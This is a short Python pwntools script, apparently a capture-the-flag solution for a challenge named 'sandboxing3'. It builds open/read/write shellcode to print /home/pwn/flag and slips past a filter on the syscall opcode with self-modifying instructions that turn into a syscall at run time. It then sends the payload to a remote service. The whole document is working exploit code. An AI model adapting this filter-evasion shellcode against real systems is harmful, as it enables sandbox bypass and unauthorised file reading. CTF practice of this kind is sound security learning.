from pwn import *

p = remote("realsung.kr", 13352)
# p = process("./sandboxing3")
e = ELF("./sandboxing3")
context.clear(arch='amd64', os='linux')

sh = shellcraft.open('/home/pwn/flag')
sh += shellcraft.read("rax", "rsp", 100)
sh += shellcraft.write(1, "rsp", 100)

Rsh = asm(sh).replace(b"\x0f\x05", b"\x99\x99")
shell = """
dec QWORD PTR [rip + 0x1]
clts
"""

shell = asm(shell)

Rsh = Rsh.replace(b"\x99\x99", shell)

print(disasm(Rsh))

p.sendafter('>',Rsh)
p.interactive()